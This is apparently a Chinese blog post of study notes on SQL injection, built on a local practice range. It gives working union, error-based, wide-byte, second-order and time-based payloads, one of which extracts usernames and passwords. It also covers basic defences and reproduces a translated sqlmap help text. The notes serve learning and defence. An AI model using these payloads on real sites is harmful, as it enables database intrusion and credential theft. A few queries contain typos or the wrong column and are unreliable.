---
title: 漏洞原理---SQL注入
date: 2022-03-16 13:13:56
author: ReadPond
tags: 
- 漏洞
- SQL注入
categories:   
- 漏洞原理
top: false
index_img: /img/202301241049221.png
banner_img: /img/202301241049221.png
---

### SQL注入

   - SQL注入原理：
     - 可控变量代入数据库查询，并且变量为存在过滤或过滤不严谨
   - schema（）可以将当前数据库名称显示
   - 靶场1-4关：总结闭合的方式
     - '
     - ')
     - ''
     - '')
     - 不闭合
     - `secure_file_priv`可以设置如下这样进行设置：
         1. 设置为空，那么对所有路径均可进行导入导出。
         2. 设置为一个目录名字，那么只允许在该路径下导入导出。
         3. 设置为Null，那么禁止所有导入导出。

#### 联合注入SQL

- SQL注入的判断方式：
    - 在参数后加单引号，查看是否存在sql语法报错，如“`**sql syntax**`”
    - 插入简短的payload，查看响应结果是否复合预期；`**and 1=1**` 页面正常，`**and 1=2**`页面异常；`**and sleep(5)**`，确认sql注入点
    - `**order by ? **`确定当前网站对接的数据库下的这张表（当前网页使用的这张表）的列数；从1一直往后递增，一直到页面出现报错，或者其他的异常情况，那么最后一次正常回显页面的最大数字就是当前表的列数； order by 3 正常；`**order by 4** `异常；当前表的列数就是3列；
    - `**union select**` 确定有没有回显的点；`**id = -1' union select 1,2,3 --+**` ，让前面的查不出来值，那么联合查询后面的值就会作为网站输出页面中被取的值；当`**id=-1**`时，未能在原本的表中查询到对应的信息，那么就会查询到后面的select语句中的值，如果2能够在页面中显示，那么说明2这个位置（一行一列的单元格可以显示内容）；确定网站中注入的回显点！
    - 在存在回显点的地方，插入自定义的攻击代码，比如`**schema()**`；可以将当前网站的数据库名称在网页中显示出来。
    - 继续利用，将`**schema()**`换成其他的查询代码，以获取更多信息；
        - a. 确定表名；
        - b. 确定列名
        - c. 根据查询到的表名和列名，查询具体的数据

### 判断是否存在注入点

```sql
id = 1 or 1 = 1
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281357750.png)
- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281357094.png)
- 

### 判断字段数

```sql
id = 1' order by 1-99 --+  # 假设有三列回显
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358609.png)
- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358048.png)

### 确定回显点

```sql
id = -1 unicon select 1，2，3   # 假设在2中有注入点
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358404.png) 

### 探测数据库名称

```sql
id = -1' union select 1,database(),3 --+  # security
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281358613.png)
- 在mySQL中5以上， mysql 默认在数据库中存放在一个叫` infomation_schema `里 面 ，这个库里面有很多表 重点是这三个表 `columns 、tables、SCHEMATA `表字 段 `CHEMA_NAME` 记录着库的信息  

### 判断数据库中的表

```sql
id=-1' union select 1,  (select group_concat(table_name) from information_schema.`TABLES` where table_schema = schema()) ,3 --+
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359935.png)

### 判断列

```sql
id=-1' union select 1,  (select group_concat(table_name) from information_schema.`TABLES` where table_name = 'users') ,3 --+
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359890.png)

### 根据列表名和列名，查具体数据

```sql
id=-1' union select 1,  (select  group_concat(username,'-',Password) from users) ,3 --+
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359679.png)
- 总结：
    - SQL注入的目的是为了获取数据库中的信息
    - 简单测试注入时先在搜索框中使用万能语句进行判断如：`id = 1' or 1 = 1 --+`  如果显示与当前页面内容一致，则说明存在`SQL`注入
    - 在判断存在注入后，使用`order  by 1-99` 对字段进行探测（`order by` 表示按第几列进行排序）。判断出当前网页中的数据库中的表有几个字段(判断当前表中的列数)，
    - 这里使用`order by` 的目的在于，`order by`在判断出存在几个字段后，使用`union `联合查询，确认回显位置

#### 报错注入(1,5,6)

- xml：可以存放数据，存放http协议之间传输信息，大型框架的配置文件（yml，config，ini....）
- `UPDATEXML (XML_document, XPath_string, new_value);`
    第一个参数：`XML_document`是`String`格式，为`XML`文档对象的名称，文中为Doc。（更新哪个xml，更新xml在什么地方，更新成什么值）
    第二个参数：`XPath_string` (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
    第三个参数：`new_value`，`String`格式，替换查找到的符合条件的数据

#### 报错注入是在第二个参数中发生，原因？

   - 因为在执行updatexml()函数时，会先检查XPath语法是否合规，如同写java代码一样，先对语法进行检查

#### 什么是poc，explpit ，payload

   - 一段能够利用漏洞并且具有攻击性的代码称之为poc
   - 操作系统级别的漏洞为`exloit`
   - 一段利用漏洞的代码，载荷--->`payload`

#### 为什么能使用报错注入？

   - 因为开发人员在开发时，将`print_r(mysql_error());`写入代码当中，如果将这句代码注释掉或者进行替换则前端将不再显示错误信息

#### “~”-->十六进制：0x7e，它的作用?

   - 作用是占位符标记开头和结尾，如果没有这个占位符则报错信息将会显示不完全，但是这里不一定是“~”，还可以用其他符号代替.
   - 可以没有后面占位符，但是不能没有前面的占位符

#### select  version() ---->显示当前数据库版本号信息

   - select  updatesml(xml标记位置，Xpath路径，需要修改的内容)
   - 备注：如果select version(）两端不加括号的话，就会与concat()中前一个占位符和后一个占位符进行一个字符串拼接。

```sql
id = 1' and/or updatexml(1, concat('[', (select version()), ']'), 3) --+ # XPATH syntax error: '[5.7.26-log]'
```

   - ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359422.png)

#### floor()报错函数

- floor()函数作用：是不管四舍五入都进行向下取整

##### 总结(有几个参数每个参数代表什么，为什么能发生报错注入漏洞，为什么要在concat前面要拼接字符，不拼接会发生什么，能拼接以哪种形式可以拼接那种不能拼接)：

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281438034.png)

```sql
SELECT updatexml(1, concat('a',(select group_concat(table_name) from information_schema.`TABLES` where table_schema = SCHEMA())), '~')
```

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281359422.png)

```sql
SELECT updatexml(1, concat(1,(select group_concat(table_name) from information_schema.`TABLES` where table_schema = SCHEMA())), '~')
```

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281401742.png)

```sql
SELECT updatexml(1, concat('~',(select group_concat(table_name) from information_schema.`TABLES` where table_schema = SCHEMA())), '~')
```

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402662.png)

```sql
SELECT updatexml(1, concat('/',(select group_concat(table_name) from information_schema.`TABLES` where table_schema = SCHEMA())), '~')
```

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402258.png)

```sql
SELECT updatexml(1, concat('\\',(select group_concat(table_name) from information_schema.`TABLES` where table_schema = SCHEMA())), '~')
```

#### 宽字节注入(冷门注入方式)（32）

- WAF为web应用防火墙，WAF当中存放着各种各样的正则表达式
- %27：为单引号
- '\'：%5c
- %df%5C：運
- 目前SQL中存在逻辑漏洞
- 宽字节是相对于ascII这样单字节而言的；像GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节
- GBK是一种多字符的编码，通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节
- 转义函数：为了过滤用户输入的一些数据，对特殊的字符加上反斜杠“\”进行转义；Mysql中转义的函数addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种是配置magic_quote_gpc，不过PHP高版本已经移除此功能
- 总结：
    - 宽字符注入是一种编码转换上存在的漏洞，一般SQL在设置编码是会开启过滤特殊字符，比如 '  ')   '')，一般这种漏洞存在于php前端页面编码与数据库编码不一致所导致。 要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析SQL语句，其次还要保证在该种字符集范围中包含低字节位是0x5C(01011100) 的字符，初步的测试结果 Big5 和 GBK 字符集都是有的，UTF-8 和GB2312没有这种字符（也就不存在宽字节注入）。  换句话说假如php前端页面数据和后端SQL编码都采用UTF-8 或者GB2312编码就不存在宽字节注入
    - 在宽字节注入时，注入逻辑和联合注入逻辑相似，只是在宽字节注入时需要对单独的引号做%df%5C%27用来逃避SQL设置的过滤特殊字符设置 如：`id=-1%df%5C%27 or 1 = 1`。SQL中常见的转义设置与配置addslashes、mysql_real_escape_string、mysql_escape_string、php.ini中magic_quote_gpc的配置
    - 在联合查询中，需要将联合查询语句当中引号当中的内容转为16进制

```sql
id=-1%df%5C%27 union select 1,  (select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273 and table_schema = 0x7365637572697479) ,3 --+
```

   - ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281402665.png)

#### 二次注入（24）

- 使用正常功能插入数据
- `echo '\'' ---->'`
- 原理：在一次注入是数据中存在非法字符，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。
- 例如：在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。
- 二次注入的目的
    - 为了获取数据库中的信息，伪造身份
- 二次注入为什么会生效：
    - 用户从前端输入数据库中的一个用户名(用户名必须是数据库当中的)并且在用户名后面跟上转义字符，比如数据库中的用户名Tom  在新的注册页面上输入`Tom'#` / `Tom'--空格`  然后在修改密码，如果修改密码成功页面成功，就说明`Tom'#`修改的密码是数据库中原有Tom的密码，不是Tom'#的密码，之所以会出现这种情况是因为注入点发生在Tom和`#`/`--空格`之间的`'`，因为 `'\''`转义后输出为`'`，

`#`/`--空格`会把后面内容注释，`'`会和`'Tom`组成数据库中原有的Tom并且第二次注册的`Tom'#`依然可以登录

```sql
SELECT username  FROM `users` WHERE username = 'username' and curr_password = '$curr_password' # 原有SQL
SELECT username  FROM `users` WHERE username = 'Tom' #' and curr_password ='$curr_password' # 修改
SELECT username  FROM `users` WHERE username = 'Tom' -- ' and curr_password ='$curr_password'
```

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403148.png)
过程：

1. 账户原有用户

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403170.png)

2. 添加新用户：

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403666.png)

3. 以新用户登录

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403128.png)

4. 修改密码

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404676.png)

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403502.png)

5. 查看数据库，实际修改的密码为数据库中原有Tom的密码

![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281403182.png)

#### 延迟注入（9，10）

有单引号闭合叫：字符型闭合
没有单引号和括号叫数字型注入

-  id = -1' and if((substr(schema()) ,1,1)  = 'a',条件为真，条件为假 )
-  先猜长度再猜值
-  length对字符串的标点也要进行统计
-  在写脚本时为什么先获取长度？
    - 因为，在黑盒测试下，攻击者不清楚数库中的信息，所以需要对数据库名称进行一个个探测，写脚本是用循环不清楚要循环多少次才能测试出整个数据库名称，假如先获取当前数据库名车长度然后根据长度在做循环，就可以简化脚本运行时间提高效率。简而言之获取长度是为了知道脚本再什么时候停止运行。
-  再获取表中字段时，为什么tmp = ''要放在for循环外面
    - 因为如果放在for循环里面，tmp = ''都要初始化，每循环一次，就初始化一次，导致循环结果放不到tmp当中
-  延迟注入
    - 在测试过程中，攻击方对目标目标数据库任何信息不知道的情况，在搜索框或者抓包之后看不到SQL语句的执行状态，只能从网页页面上的变化来推断出插入的SQL注入是否生效。在这种情况下可以使用盲注的方法进行对目标探测。延迟注入也是盲注的一种。
    - 先用正常参数进行探测，发现返回You are in..............
    - ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404343.png)
    - 在使用闭合方式+order by 进一步探测是否可以使用延迟注入，发现使用闭合方式+order by于正常输入参数返回结果一致，此时可以判断这里存在延迟注入
    - ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281404784.png)
    - 使用 `if()`,`length()`,`substr()`这三个依次对表的长度->表名，表中列的长度，表中内容表中列的字段，输入列名后列中所有内容长度，最后查询表中信息

```sql
  http://localhost/Less-9/?id=1' and if( substr(schema() , 1 , 1)='s'  , sleep(10) , sleep(0)) --+
```

- ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281437674.png)

#### 堆叠注入（38）

- 为什么前面关卡不能用堆叠？
    - 这是源代码层面的问题，堆叠注入时源代码使用mysqli_multi_query()函数，这个函数可以执行多个查询，而之前用到是 mysql_qurery()只能执行一条查询语句
    - 在堆叠注入时，我们可以在前后闭合的情况下，在每个查询语句后面加分号在加上一条查询语句。

#### 数据外带

- 前提：MySQL所在主机可以出网，mySQL打开了相关权限

![](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281407293.jpg)

####   防范SQL注入

#### 预编译

   - 对前端输入进来的SQL语句进行转义
   - PHP中使用PDO进行预编译，PDO是PHP中的一个类
   - java中预编译类：创建preparedStatement对象，SQL语句中在需要数据的地方用"?"占位，然后使用set()方法对占位进行填充，最后用executeUpdate()进行执行
   - ![image.png](https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202301281405819.png)
   - 预编译技术不能百分百防御SQL注入

#### 转码(转义)

   - mysql_real_escape_string()——这个方法在PHP中已经过时，这个方法只在UTF-8的编码下生效

#### 正则表达式(简单粗暴，但是效果得看具体情况)

- 正则表达式匹配特殊字符，匹配到特殊字符后将其替换位空，或者拒绝执行SQL语句
     - PHP-**preg_replace方法**
     - java-**Pattern类**
     - Go-**Regexp类**
     - Python-**re包**

#### 补充：

##### 搜索框注入

-   ```
    http://localhost:8080/blog/new.php?search=百度%'union+all+select+1,database(),2,3 and '%'='
    ```

##### Json格式注入

-   ```
    http://localhost:8080/json.php
    使用Post提交，data数据如下：
    json={"username":"admin'and 1=2 union select 1,2,3#"}
    ```


##### 其他注入方式

-   后台要记录操作访问IP
    -   IP要进行代码获取，获取到之后，IP有一定概率会记录到数据库当中，如果IP能自定义数据，就可以尝试注入
-   网站要根据用户的访问设备给予显示页面
    -   接受访问的UA信息，将各种UA信息进行数据整理，用户访问后对比数据库中UA值来进行判断
-   网站要进行文件上传或者用户登录
    -   由于文件上传可大可小，如果采用GET则无法满足传输条件，URl长度限制会触发，所以一般会采用POST
    -   用户登录，接收到账号和密码后会带入后端数据库当中进行对比。可以尝试注入
-   在数据包中添加`X-Forwarded-For: 伪造的IP地址`如果页面

#### SQLmap

```sql
用法：python sqlmap.py [选项]

选项：
  -h, --help            显示基本帮助信息并退出
  -hh                   显示高级帮助信息并退出
  --version             显示程序版本信息并退出
  -v VERBOSE            输出信息详细程度级别：0-6（默认为 1）

  目标：
    至少提供一个以下选项以指定目标

    -u URL, --url=URL   目标 URL（例如："http://www.site.com/vuln.php?id=1"）
    -d DIRECT           可直接连接数据库的地址字符串
    -l LOGFILE          从 Burp 或 WebScarab 代理的日志文件中解析目标地址
    -m BULKFILE         从文本文件中获取批量目标
    -r REQUESTFILE      从文件中读取 HTTP 请求
    -g GOOGLEDORK       使用 Google dork 结果作为目标
    -c CONFIGFILE       从 INI 配置文件中加载选项

  请求：
    以下选项可以指定连接目标地址的方式

    -A AGENT, --user..  设置 HTTP User-Agent 头部值
    -H HEADER, --hea..  设置额外的 HTTP 头参数（例如："X-Forwarded-For: 127.0.0.1"）
    --method=METHOD     强制使用提供的 HTTP 方法（例如：PUT）
    --data=DATA         使用 POST 发送数据串（例如："id=1"）
    --param-del=PARA..  设置参数值分隔符（例如：&）
    --cookie=COOKIE     指定 HTTP Cookie（例如："PHPSESSID=a8d127e.."）
    --cookie-del=COO..  设置 cookie 分隔符（例如：;）
    --live-cookies=L..  指定 Live cookies 文件以便加载最新的 Cookies 值
    --load-cookies=L..  指定以 Netscape/wget 格式存放 cookies 的文件
    --drop-set-cookie   忽略 HTTP 响应中的 Set-Cookie 参数
    --mobile            使用 HTTP User-Agent 模仿智能手机
    --random-agent      使用随机的 HTTP User-Agent
    --host=HOST         指定 HTTP Host
    --referer=REFERER   指定 HTTP Referer
    --headers=HEADERS   设置额外的 HTTP 头参数（例如："Accept-Language: fr\nETag: 123"）
    --auth-type=AUTH..  HTTP 认证方式（Basic，Digest，NTLM 或 PKI）
    --auth-cred=AUTH..  HTTP 认证凭证（username:password）
    --auth-file=AUTH..  HTTP 认证 PEM 证书/私钥文件
    --ignore-code=IG..  忽略（有问题的）HTTP 错误码（例如：401）
    --ignore-proxy      忽略系统默认代理设置
    --ignore-redirects  忽略重定向尝试
    --ignore-timeouts   忽略连接超时
    --proxy=PROXY       使用代理连接目标 URL
    --proxy-cred=PRO..  使用代理进行认证（username:password）
    --proxy-file=PRO..  从文件中加载代理列表
    --proxy-freq=PRO..  通过给定列表中的不同代理依次发出请求
    --tor               使用 Tor 匿名网络
    --tor-port=TORPORT  设置 Tor 代理端口代替默认端口
    --tor-type=TORTYPE  设置 Tor 代理方式（HTTP，SOCKS4 或 SOCKS5（默认））
    --check-tor         检查是否正确使用了 Tor
    --delay=DELAY       设置每个 HTTP 请求的延迟秒数
    --timeout=TIMEOUT   设置连接响应的有效秒数（默认为 30）
    --retries=RETRIES   连接超时时重试次数（默认为 3）
    --randomize=RPARAM  随机更改给定的参数值
    --safe-url=SAFEURL  测试过程中可频繁访问且合法的 URL 地址（译者注：
                        有些网站在你连续多次访问错误地址时会关闭会话连接，
                        后面的“请求”小节有详细说明）
    --safe-post=SAFE..  使用 POST 方法发送合法的数据
    --safe-req=SAFER..  从文件中加载合法的 HTTP 请求
    --safe-freq=SAFE..  在访问给定的合法 URL 之间穿插发送测试请求
    --skip-urlencode    不对 payload 数据进行 URL 编码
    --csrf-token=CSR..  设置网站用来反 CSRF 攻击的 token
    --csrf-url=CSRFURL  指定可提取防 CSRF 攻击 token 的 URL
    --csrf-method=CS..  指定访问防 CSRF token 页面时使用的 HTTP 方法
    --csrf-retries=C..  指定获取防 CSRF token 的重试次数 （默认为 0）
    --force-ssl         强制使用 SSL/HTTPS
    --chunked           使用 HTTP 分块传输编码（POST）请求
    --hpp               使用 HTTP 参数污染攻击
    --eval=EVALCODE     在发起请求前执行给定的 Python 代码（例如：
                        "import hashlib;id2=hashlib.md5(id).hexdigest()"）

  优化：
    以下选项用于优化 sqlmap 性能

    -o                  开启所有优化开关
    --predict-output    预测常用请求的输出
    --keep-alive        使用持久的 HTTP(S) 连接
    --null-connection   仅获取页面大小而非实际的 HTTP 响应
    --threads=THREADS   设置 HTTP(S) 请求并发数最大值（默认为 1）

  注入：
    以下选项用于指定要测试的参数，
    提供自定义注入 payloads 和篡改参数的脚本

    -p TESTPARAMETER    指定需要测试的参数
    --skip=SKIP         指定要跳过的参数
    --skip-static       指定跳过非动态参数
    --param-exclude=..  用正则表达式排除参数（例如："ses"）
    --param-filter=P..  通过位置过滤可测试参数（例如："POST"）
    --dbms=DBMS         指定后端 DBMS（Database Management System，
                        数据库管理系统）类型（例如：MySQL）
    --dbms-cred=DBMS..  DBMS 认证凭据（username:password）
    --os=OS             指定后端 DBMS 的操作系统类型
    --invalid-bignum    将无效值设置为大数
    --invalid-logical   对无效值使用逻辑运算
    --invalid-string    对无效值使用随机字符串
    --no-cast           关闭 payload 构造机制
    --no-escape         关闭字符串转义机制
    --prefix=PREFIX     注入 payload 的前缀字符串
    --suffix=SUFFIX     注入 payload 的后缀字符串
    --tamper=TAMPER     用给定脚本修改注入数据

  检测：
    以下选项用于自定义检测方式

    --level=LEVEL       设置测试等级（1-5，默认为 1）
    --risk=RISK         设置测试风险等级（1-3，默认为 1）
    --string=STRING     用于确定查询结果为真时的字符串
    --not-string=NOT..  用于确定查询结果为假时的字符串
    --regexp=REGEXP     用于确定查询结果为真时的正则表达式
    --code=CODE         用于确定查询结果为真时的 HTTP 状态码
    --smart             只在使用启发式检测时才进行彻底的测试
    --text-only         只根据页面文本内容对比页面
    --titles            只根据页面标题对比页面

  技术：
    以下选项用于调整特定 SQL 注入技术的测试方法

    --technique=TECH..  使用的 SQL 注入技术（默认为“BEUSTQ”，译者注：
                        B: Boolean-based blind SQL injection（布尔型盲注）
                        E: Error-based SQL injection（报错型注入）
                        U: UNION query SQL injection（联合查询注入）
                        S: Stacked queries SQL injection（堆叠查询注入）
                        T: Time-based blind SQL injection（时间型盲注）
                        Q: inline Query injection（内联查询注入）
    --time-sec=TIMESEC  延迟 DBMS 的响应秒数（默认为 5）
    --union-cols=UCOLS  设置联合查询注入测试的列数目范围
    --union-char=UCHAR  用于暴力猜解列数的字符
    --union-from=UFROM  设置联合查询注入 FROM 处用到的表
    --dns-domain=DNS..  设置用于 DNS 渗出攻击的域名（译者注：
                        推荐阅读《在SQL注入中使用DNS获取数据》
                        http://cb.drops.wiki/drops/tips-5283.html，
                        在后面的“技术”小节中也有相应解释）
    --second-url=SEC..  设置二阶响应的结果显示页面的 URL（译者注：
                        该选项用于 SQL 二阶注入）
    --second-req=SEC..  从文件读取 HTTP 二阶请求

  指纹识别：
    -f, --fingerprint   执行广泛的 DBMS 版本指纹识别

  枚举：
    以下选项用于获取后端 DBMS 的信息，结构和数据表中的数据

    -a, --all           获取所有信息、数据
    -b, --banner        获取 DBMS banner
    --current-user      获取 DBMS 当前用户
    --current-db        获取 DBMS 当前数据库
    --hostname          获取 DBMS 服务器的主机名
    --is-dba            探测 DBMS 当前用户是否为 DBA（数据库管理员）
    --users             枚举出 DBMS 所有用户
    --passwords         枚举出 DBMS 所有用户的密码哈希
    --privileges        枚举出 DBMS 所有用户特权级
    --roles             枚举出 DBMS 所有用户角色
    --dbs               枚举出 DBMS 所有数据库
    --tables            枚举出 DBMS 数据库中的所有表
    --columns           枚举出 DBMS 表中的所有列
    --schema            枚举出 DBMS 所有模式
    --count             获取数据表数目
    --dump              导出 DBMS 数据库表项
    --dump-all          导出所有 DBMS 数据库表项
    --search            搜索列，表和/或数据库名
    --comments          枚举数据时检查 DBMS 注释
    --statements        获取 DBMS 正在执行的 SQL 语句
    -D DB               指定要枚举的 DBMS 数据库
    -T TBL              指定要枚举的 DBMS 数据表
    -C COL              指定要枚举的 DBMS 数据列
    -X EXCLUDE          指定不枚举的 DBMS 标识符
    -U USER             指定枚举的 DBMS 用户
    --exclude-sysdbs    枚举所有数据表时，指定排除特定系统数据库
    --pivot-column=P..  指定主列
    --where=DUMPWHERE   在转储表时使用 WHERE 条件语句
    --start=LIMITSTART  指定要导出的数据表条目开始行数
    --stop=LIMITSTOP    指定要导出的数据表条目结束行数
    --first=FIRSTCHAR   指定获取返回查询结果的开始字符位
    --last=LASTCHAR     指定获取返回查询结果的结束字符位
    --sql-query=SQLQ..  指定要执行的 SQL 语句
    --sql-shell         调出交互式 SQL shell
    --sql-file=SQLFILE  执行文件中的 SQL 语句

  暴力破解：
    以下选项用于暴力破解测试

    --common-tables     检测常见的表名是否存在
    --common-columns    检测常用的列名是否存在
    --common-files      检测普通文件是否存在

  用户自定义函数注入：
    以下选项用于创建用户自定义函数

    --udf-inject        注入用户自定义函数
    --shared-lib=SHLIB  共享库的本地路径

  访问文件系统：
    以下选项用于访问后端 DBMS 的底层文件系统

    --file-read=FILE..  读取后端 DBMS 文件系统中的文件
    --file-write=FIL..  写入到后端 DBMS 文件系统中的文件
    --file-dest=FILE..  使用绝对路径写入到后端 DBMS 中的文件

  访问操作系统：
    以下选项用于访问后端 DBMS 的底层操作系统

    --os-cmd=OSCMD      执行操作系统命令
    --os-shell          调出交互式操作系统 shell
    --os-pwn            调出 OOB shell，Meterpreter 或 VNC
    --os-smbrelay       一键调出 OOB shell，Meterpreter 或 VNC
    --os-bof            利用存储过程的缓冲区溢出
    --priv-esc          数据库进程用户提权
    --msf-path=MSFPATH  Metasploit 框架的本地安装路径
    --tmp-path=TMPPATH  远程临时文件目录的绝对路径

  访问 Windows 注册表：
    以下选项用于访问后端 DBMS 的 Windows 注册表

    --reg-read          读取一个 Windows 注册表键值
    --reg-add           写入一个 Windows 注册表键值数据
    --reg-del           删除一个 Windows 注册表键值
    --reg-key=REGKEY    指定 Windows 注册表键
    --reg-value=REGVAL  指定 Windows 注册表键值
    --reg-data=REGDATA  指定 Windows 注册表键值数据
    --reg-type=REGTYPE  指定 Windows 注册表键值类型

  通用选项：
    以下选项用于设置通用的参数

    -s SESSIONFILE      从文件（.sqlite）中读入会话信息
    -t TRAFFICFILE      保存所有 HTTP 流量记录到指定文本文件
    --answers=ANSWERS   预设回答（例如："quit=N,follow=N"）
    --base64=BASE64P..  表明参数包含 Base64 编码的数据
    --base64-safe       使用 URL 与文件名安全的 Base64 字母表（RFC 4648）
    --batch             从不询问用户输入，使用默认配置
    --binary-fields=..  具有二进制值的结果字段（例如："digest"）
    --check-internet    在访问目标之前检查是否正常连接互联网
    --cleanup           清理 DBMS 中特定的 sqlmap UDF 与数据表
    --crawl=CRAWLDEPTH  从目标 URL 开始爬取网站
    --crawl-exclude=..  用正则表达式筛选爬取的页面（例如："logout"）
    --csv-del=CSVDEL    指定输出到 CVS 文件时使用的分隔符（默认为“,”）
    --charset=CHARSET   指定 SQL 盲注字符集（例如："0123456789abcdef"）
    --dump-format=DU..  导出数据的格式（CSV（默认），HTML 或 SQLITE）
    --encoding=ENCOD..  指定获取数据时使用的字符编码（例如：GBK）
    --eta               显示每个结果输出的预计到达时间
    --flush-session     清空当前目标的会话文件
    --forms             解析并测试目标 URL 的表单
    --fresh-queries     忽略存储在会话文件中的查询结果
    --gpage=GOOGLEPAGE  指定所用 Google dork 结果的页码
    --har=HARFILE       将所有 HTTP 流量记录到一个 HAR 文件中
    --hex               获取数据时使用 hex 转换
    --output-dir=OUT..  自定义输出目录路径
    --parse-errors      从响应中解析并显示 DBMS 错误信息
    --preprocess=PRE..  使用给定脚本做前处理（请求）
    --postprocess=PO..  使用给定脚本做后处理（响应）
    --repair            重新导出具有未知字符的数据（?）
    --save=SAVECONFIG   将选项设置保存到一个 INI 配置文件
    --scope=SCOPE       用正则表达式过滤目标
    --skip-heuristics   不对 SQLi/XSS 漏洞进行启发式检测
    --skip-waf          不对 WAF/IPS 进行启发式检测
    --table-prefix=T..  指定临时数据表名前（默认："sqlmap"）
    --test-filter=TE..  根据 payloads 和/或标题（例如：ROW）选择测试
    --test-skip=TEST..  根据 payloads 和/或标题（例如：BENCHMARK）跳过部分测试
    --web-root=WEBROOT  指定 Web 服务器根目录（例如："/var/www"）
    

  杂项：
    以下选项不属于前文的任何类别

    -z MNEMONICS        使用短助记符（例如：“flu,bat,ban,tec=EU”）
    --alert=ALERT       在找到 SQL 注入时运行 OS 命令
    --beep              在问题提示或在发现 SQL 注入/XSS/FI 时发出提示音
    --dependencies      检查 sqlmap 缺少（可选）的依赖
    --disable-coloring  关闭彩色控制台输出
    --offline           在离线模式下工作（仅使用会话数据）
    --purge             安全删除 sqlmap data 目录所有内容
    --results-file=R..  指定多目标模式下的 CSV 结果输出路径
    --shell             调出交互式 sqlmap shell
    --tmp-dir=TMPDIR    指定用于存储临时文件的本地目录
    --unstable          为不稳定连接调整选项
    --update            更新 sqlmap
    --wizard            适合初级用户的向导界面
```

